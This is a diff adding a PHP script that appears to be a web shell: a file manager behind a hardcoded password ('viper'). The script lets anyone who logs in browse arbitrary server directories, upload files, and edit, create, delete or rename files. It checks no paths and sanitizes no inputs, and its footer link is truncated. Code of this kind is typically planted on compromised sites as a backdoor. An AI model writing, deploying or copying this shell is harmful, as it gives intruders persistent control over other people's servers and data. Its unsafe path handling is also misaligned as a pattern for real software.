@@ -1,0 +1,234 @@
+<?php
+header('Content-Type: text/html; charset=UTF-8');
+session_start();
+
+// 登录验证
+if (isset($_POST['password'])) {
+    if ($_POST['password'] === 'viper') {
+        $_SESSION['auth'] = true;
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = "密码错误";
+    }
+}
+
+// 如果未登录，显示登录页面
+if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
+    echo '<!DOCTYPE html><html><head><title>登录</title>';
+    echo '<style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}';
+    echo '.login{background:white;padding:20px;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);text-align:center}';
+    echo 'input{padding:8px;margin:10px 0;width:200px}';
+    echo 'button{padding:8px 15px;background:#4CAF50;color:white;border:none;cursor:pointer}';
+    echo '.error{color:red;margin-bottom:10px}</style></head><body>';
+    echo '<div class="login"><h2>HI！MY：Dom~</h2>';
+    if (isset($error)) echo '<div class="error">'.$error.'</div>';
+    echo '<form method="post"><input type="password" name="password" placeholder="请输入密码" autofocus>';
+    echo '<br><button type="submit">登录</button></form></div></body></html>';
+    exit;
+}
+
+$currentDir = $_GET['dir'] ?? __DIR__;
+$originalDir = $_GET['root'] ?? __DIR__;
+
+function handleUpload($directory) {
+    if (!empty($_FILES['files'])) {
+        $uploaded = 0;
+        $failed = 0;
+
+        foreach ($_FILES['files']['name'] as $key => $name) {
+            if (!empty($name)) {
+                $fileName = basename($name);
+                $tmpName = $_FILES['files']['tmp_name'][$key];
+                $targetFile = $directory . DIRECTORY_SEPARATOR . $fileName;
+
+                if (move_uploaded_file($tmpName, $targetFile)) {
+                    $uploaded++;
+                } else {
+                    $failed++;
+                }
+            }
+        }
+
+        $message = "上传成功：$uploaded 个文件；失败：$failed 个文件。";
+        echo "<script>alert('$message'); window.location.href=window.location.href;</script>";
+    }
+}
+
+function handleCreateFolder($directory) {
+    if (!empty($_POST['folderName'])) {
+        $newFolder = $directory . DIRECTORY_SEPARATOR . $_POST['folderName'];
+        if (!is_dir($newFolder)) {
+            if (mkdir($newFolder)) {
+                echo "<script>alert('创建成功'); window.location.href=window.location.href;</script>";
+            } else {
+                echo "<script>alert('创建失败'); window.location.href=window.location.href;</script>";
+            }
+        } else {
+            echo "<script>alert('目录已存在'); window.location.href=window.location.href;</script>";
+        }
+    }
+}
+
+function handleCreateFile($directory) {
+    if (!empty($_POST['fileName'])) {
+        $newFile = $directory . DIRECTORY_SEPARATOR . $_POST['fileName'];
+        if (!file_exists($newFile)) {
+            if (file_put_contents($newFile, '') !== false) {
+                echo "<script>alert('创建成功'); window.location.href=window.location.href;</script>";
+            } else {
+                echo "<script>alert('创建失败'); window.location.href=window.location.href;</script>";
+            }
+        } else {
+            echo "<script>alert('文件已存在'); window.location.href=window.location.href;</script>";
+        }
+    }
+}
+
+function handleEditFile($filePath) {
+    if (isset($_POST['content'])) {
+        file_put_contents($filePath, $_POST['content']);
+        echo "<script>alert('保存成功'); window.location.href=window.location.href;</script>";
+    }
+
+    $content = htmlspecialchars(file_get_contents($filePath));
+    echo "<form method='POST'>";
+    echo "<textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>";
+    echo "<input type='submit' value='保存'>";
+    echo "</form>";
+}
+
+function handleDeleteFile($filePath) {
+    if (file_exists($filePath)) {
+        unlink($filePath);
+        echo "<script>alert('删除成功'); window.location.href=window.location.href;</script>";
+    }
+}
+
+function handleRenameFile($filePath) {
+    if (!empty($_POST['newName'])) {
+        $newPath = dirname($filePath) . DIRECTORY_SEPARATOR . $_POST['newName'];
+        if (rename($filePath, $newPath)) {
+            echo "<script>alert('重命名成功'); window.location.href=window.location.href;</script>";
+        } else {
+            echo "<script>alert('重命名失败'); window.location.href=window.location.href;</script>";
+        }
+    } else {
+        echo "<form method='POST'>";
+        echo "<input type='text' name='newName' placeholder='新文件名'>";
+        echo "<input type='submit' value='重命名'>";
+        echo "</form>";
+    }
+}
+
+function displayDirectory($directory) {
+    $files = array_diff(scandir($directory), array('.', '..'));
+    echo "<div><h3>目录内容：'$directory'</h3><ul>";
+
+    foreach ($files as $file) {
+        $path = realpath("$directory/$file");
+        $style = getFileStatus($path);
+        $isDir = is_dir($path) ? 'directory' : 'file';
+
+        echo "<li class='$isDir' style='$style'>";
+        echo $isDir === 'directory'
+            ? "<a href='?dir=" . urlencode($path) . "&root=" . urlencode($_GET['root'] ?? __DIR__) . "'>$file</a>"
+            : "$file <span class='actions'> - " . generateFileActions($directory, $file) . "</span>";
+        echo "</li>";
+    }
+    echo "</ul></div>";
+}
+
+function getFileStatus($path) {
+    if (is_writable($path) && is_readable($path)) {
+        return "border-left: 4px solid green;";
+    } elseif (!is_writable($path)) {
+        return "border-left: 4px solid red;";
+    } elseif (is_readable($path)) {
+        return "border-left: 4px solid white;";
+    }
+    return "";
+}
+
+function generateFileActions($directory, $file) {
+    $root = urlencode($_GET['root'] ?? __DIR__);
+    return 
+        "<a href='?dir=" . urlencode($directory) . "&action=edit&file=" . urlencode($file) . "&root=$root'>编辑</a> | 
+         <a href='?dir=" . urlencode($directory) . "&action=delete&file=" . urlencode($file) . "&root=$root'>删除</a> | 
+         <a href='?dir=" . urlencode($directory) . "&action=rename&file=" . urlencode($file) . "&root=$root'>重命名</a>";
+}
+
+function handleFileActions($filePath) {
+    if (isset($_GET['action'])) {
+        switch ($_GET['action']) {
+            case 'edit':
+                handleEditFile($filePath);
+                break;
+            case 'delete':
+                handleDeleteFile($filePath);
+                break;
+            case 'rename':
+                handleRenameFile($filePath);
+                break;
+        }
+    }
+}
+
+echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>文件管理器</title>
+<style>
+    body { font-family: Arial; padding: 20px; background: #f8f8f8; }
+    .container { display: flex; gap: 40px; align-items: flex-start; }
+    .block { border: 1px solid #ccc; padding: 15px; border-radius: 8px; width: 300px; background: #fff; }
+    h3 { margin-top: 0; }
+    .actions { font-size: 12px; color: #555; }
+    .footer { font-size: 12px; color: #666; margin-top: 20px; }
+</style>
+</head><body>";
+
+echo "<p>当前目录: <strong>$currentDir</strong></p>";
+echo "<p>
+    <a href='?dir=" . urlencode(dirname($currentDir)) . "&root=" . urlencode($originalDir) . "'>返回上级目录</a> | 
+    <a href='?dir=" . urlencode($originalDir) . "&root=" . urlencode($originalDir) . "'>回到原目录</a>
+</p>";
+
+if (isset($_GET['action'])) {
+    $filePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['file'];
+    handleFileActions($filePath);
+}
+
+displayDirectory($currentDir);
+
+echo "<div class='container'>";
+
+// 上传文件
+echo "<div class='block'>";
+echo "<h3>上传文件（最多5个）</h3><form method='POST' enctype='multipart/form-data'>";
+for ($i = 0; $i < 5; $i++) {
+    echo "<input type='file' name='files[]'><br>";
+}
+echo "<br><input type='submit' value='上传'>";
+echo "</form>";
+echo "</div>";
+
+// 合并创建目录和文件
+echo "<div class='block'>";
+echo "<h3>创建目录 & 创建文件</h3><form method='POST'>";
+echo "<input type='text' name='folderName' placeholder='目录名称'><br><br>";
+echo "<input type='submit' value='创建目录'><br><br>";
+echo "<input type='text' name='fileName' placeholder='文件名称'><br><br>";
+echo "<input type='submit' value='创建文件'>";
+echo "</form>";
+echo "</div>";
+
+echo "</div>"; // container 结束
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    handleUpload($currentDir);
+    handleCreateFolder($currentDir);
+    handleCreateFile($currentDir);
+}
+
+echo "<p class='footer'><a href='https://t.'>G</a> - </p>";
+
+echo "</body></html>";
+?>
